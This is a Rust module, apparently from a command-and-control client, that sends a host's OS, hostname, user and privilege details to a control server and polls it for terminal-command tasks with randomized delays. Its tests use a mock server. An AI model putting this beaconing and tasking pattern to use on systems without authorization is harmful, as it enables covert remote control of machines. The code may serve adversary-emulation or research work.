use std::{
    time::Duration
};
use reqwest::Client;
use reqwest::header::CONTENT_TYPE;

use crate::models::{
    Task,
    Auth,
};


const TIMEOUT: Duration = Duration::from_secs(2);
const INIT_ENDPOINT: &'static str = "/control/client/init";
const COMMAND_ENDPOINT: &'static str = "/control/client/task";
const CONTENT_HEADER_VALUE: &'static str = "application/json";
const AUTHORIZATION_HEADER: &'static str = "Authorization";


/// Sends the clients identifying characteristics to the control server.
///
/// # Returns
/// authorization token received from the control server.
///
/// # Errors
/// This function fails if there are issues sending the request, or if 200 is not returned from
/// the server
pub async fn send_identity(id_json: String, url: &str) -> Result<String, anyhow::Error> {
    let client = Client::builder()
        .timeout(TIMEOUT)
        .build()?;
    let res = client.post(format!("{}{}", url, INIT_ENDPOINT))
        .header(CONTENT_TYPE, CONTENT_HEADER_VALUE)
        .body(id_json)
        .send()
        .await?;
    let code = res.status();
    if code != 200 {
        #[cfg(debug_assertions)]
        println!("Failed POST: {}", code);

        return Err(anyhow::Error::msg(code));
    }
    let response: Auth = serde_json::from_str(&*(res.text().await?))
        .unwrap_or_else(|_error| {
            Auth { authorization: String::from("") }
        });
    Ok(response.authorization)
}


/// Asks the control server for commands to run
///
/// # Returns
/// Vector of Tasks the server wants the client to run
///
/// # Errors
/// The function fails if there are issues sending the requests or if 200 is not returned from
/// the server
pub async fn get_commands(token: &String, url: &str) -> Result<Vec<Task>, anyhow::Error> {
    let client = Client::builder()
        .timeout(TIMEOUT)
        .build()?;
    let res = client.get(&format!("{}{}", url, COMMAND_ENDPOINT))
        .header(CONTENT_TYPE, CONTENT_HEADER_VALUE)
        .header(AUTHORIZATION_HEADER, token)
        .send()
        .await?;
    let code = res.status();
    if res.status() != 200 {
        #[cfg(debug_assertions)]
        println!("Failed GET: {}", code);

        return Err(anyhow::Error::msg(code))
    }

    let tasks: Vec<Task> = serde_json::from_str(&*(res.text().await?))
        .unwrap_or_else(|_error| {
            Vec::new()
        });
    Ok(tasks)
}


/// Tests for the communication module
#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    #[actix_rt::test]
    async fn test_send_identity() {
        let url: &'static str = env!("CONTROL_SERVER_URL");
        let id = json!({
        "os_name": "test",
        "os_version": "test",
        "hostname": "test",
        "host_user": "test",
        "privileges": "test" });
        match send_identity(id.to_string(), url).await {
            Ok(val) => {
                assert_eq!(val, String::from("12345"));
            },
            Err(_) => assert!(false)
        };
    }

    #[actix_rt::test]
    async fn test_send_identity_invalid_url() {
        let url = "https://1.2.3.4";
        let id = "test";
        match send_identity(id.to_string(), url).await {
            Ok(_val) => assert!(false),
            Err(_) => assert!(true)
        };
    }

    #[actix_rt::test]
    async fn test_get_commands() {
        let url: &'static str = env!("CONTROL_SERVER_URL");
        let auth = &String::from("12345");

        // Tasks pre-defined in test/mock_server.py
        let t1 = Task {
            data: String::from("ls -al"),
            max_delay: 500,
            min_delay: 0,
            name: String::from("terminal"),
        };
        let t2 = Task {
            data: String::from("echo Hejsan!"),
            max_delay: 1000,
            min_delay: 100,
            name: String::from("terminal"),
        };
        let t_expected = vec!(t1, t2);

        match get_commands(auth, url).await {
            Ok(t_actual) => {
                for i in 0..t_actual.len() {
                    assert_eq!(t_expected[i].data, t_actual[i].data);
                    assert_eq!(t_expected[i].max_delay, t_actual[i].max_delay);
                    assert_eq!(t_expected[i].min_delay, t_actual[i].min_delay);
                    assert_eq!(t_expected[i].data, t_actual[i].data);
                }
            },
            Err(_) => assert!(false)
        }
    }

    #[actix_rt::test]
    async fn test_get_commands_invalid_url() {
        let url = "http://1.2.3.4";
        let auth = &String::from("12345");
        match get_commands(auth, url).await {
            Ok(_) => assert!(false),
            Err(_) => assert!(true)
        }
    }

    #[actix_rt::test]
    async fn test_get_commands_invalid_token() {
        let url: &'static str = env!("CONTROL_SERVER_URL");
        let auth = &String::from("INVALID!");
        match get_commands(auth, url).await {
            Ok(_) => assert!(false),
            Err(_) => {
                println!("Intended failure!");
                assert!(true)
            }
        }
    }
}